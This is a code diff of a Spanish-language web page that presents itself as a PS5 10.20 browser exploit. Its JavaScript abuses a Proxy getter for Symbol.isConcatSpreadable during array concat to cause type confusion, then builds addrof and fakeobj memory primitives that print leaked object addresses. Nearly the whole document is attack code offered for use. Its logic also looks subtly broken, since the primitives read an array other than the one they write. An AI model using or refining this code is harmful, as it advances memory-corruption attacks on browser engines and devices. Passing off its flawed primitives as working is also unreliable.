@@ -2,47 +2,92 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Exploit Type Confusion (CVE-2023-32435)</title>
+  <title>Exploit PS5 10.20 - Type Confusion + Primitivas</title>
   <style>
-    body {
-      background-color: #111;
-      color: #0f0;
-      font-family: monospace;
-      padding: 2em;
-    }
+    body { background:#111; color:#0f0; font-family:monospace; padding:2em; }
+    h1 { color: yellow; }
   </style>
 </head>
 <body>
-  <h1>Test Type Confusion (sin WebAssembly)</h1>
-  <div id="status">Ejecutando...</div>
+  <h1>Prueba Type Confusion + addrof / fakeobj (PS5 10.20)</h1>
+  <div id="output">Ejecutando...</div>
+
   <script>
-    function log(msg) {
-      document.getElementById("status").textContent = msg;
-      console.log(msg);
+    const f64 = new Float64Array(1);
+    const u64 = new BigUint64Array(f64.buffer);
+    const u32 = new Uint32Array(f64.buffer);
+
+    function f2i(f) {
+      f64[0] = f;
+      return u64[0];
     }
 
-    try {
-      let victim = [1.1, 2.2, 3.3];
-      let container = {obj: victim};
-      let handler = {
-        get: function(target, prop) {
-          if (prop === Symbol.isConcatSpreadable) {
-            victim[0] = {};
-            return true;
-          }
-          return target[prop];
-        }
-      };
-      let proxy = new Proxy([], handler);
-      let arr = [].concat(proxy, victim);
+    function i2f(i) {
+      u64[0] = i;
+      return f64[0];
+    }
 
-      if (typeof arr[0] === "object") {
-        log("✅ POSIBLE CONFUSIÓN DE TIPO DETECTADA");
-      } else {
-        log("❌ No se produjo type confusion");
+    function hex(i) {
+      return "0x" + i.toString(16).padStart(16, "0");
+    }
+
+    let victim = [1.1, 2.2, 3.3];
+    let obj = { marker: 13.37 };
+    let container = { obj: obj };
+
+    let leak_arr, fake_arr, master;
+
+    const handler = {
+      get: function(target, prop) {
+        if (prop === Symbol.isConcatSpreadable) {
+          leak_arr[0] = obj;
+          return true;
+        }
+        return target[prop];
       }
-    } catch (e) {
-      log("❌ Error en ejecución: " + e);
+    };
+
+    leak_arr = [1.1];
+    const proxy = new Proxy([], handler);
+    const result = proxy.concat(leak_arr);
+
+    function setup() {
+      for (let i = 0; i < result.length; i++) {
+        if (result[i] === obj) {
+          master = result;
+          break;
+        }
+      }
+
+      if (!master) {
+        document.getElementById("output").textContent = "❌ No se logró corrupción";
+        return false;
+      }
+
+      return true;
+    }
+
+    function addrof(target) {
+      leak_arr[0] = target;
+      return f2i(master[0]);
+    }
+
+    function fakeobj(addr) {
+      master[0] = i2f(addr);
+      return leak_arr[0];
+    }
+
+    if (setup()) {
+      const addr = addrof({ hola: "PS5" });
+      const fake = fakeobj(addr);
+
+      document.getElementById("output").innerHTML =
+        "✅ Primitivas listas<br>" +
+        "📍 Dirección de objeto: " + hex(addr) + "<br>" +
+        "🔁 fakeobj apunta a: " + JSON.stringify(fake);
+
+      console.log("[+] addrof:", hex(addr));
+      console.log("[+] fakeobj:", fake);
     }
   </script>
 </body>
